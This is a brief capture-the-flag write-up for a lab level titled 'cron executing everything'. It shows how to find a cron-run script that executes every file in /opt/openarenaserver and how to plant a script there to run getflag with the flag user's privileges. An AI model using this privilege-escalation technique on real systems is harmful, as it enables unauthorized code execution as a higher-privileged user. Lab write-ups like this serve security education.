▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▓▓▌▐▓▓▓▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   
▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌   ▐▓▌▐▓▌▐▓▓▓▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌   ▐▓▌
▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌

exploit: cron executing everything

=======
We have nothing. Let's check for files:
find . / -user flag05
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

This script tells us that every 5 minutes, all the scripts inside /opt/openarenaserver get executed and then removed.
Then let's create a script that calls getflag and put the result inside a file (the cron cannot simply print getflag as its a cron that executes and we dont have acces to logs).

touch /opt/openarenaserver/script.sh
script.sh:
getflag > /tmp/flag
chmod +x /opt/openarenaserver/script.sh

Let's wait and check periodically if the /tmp/flag got created yet. Be patient.

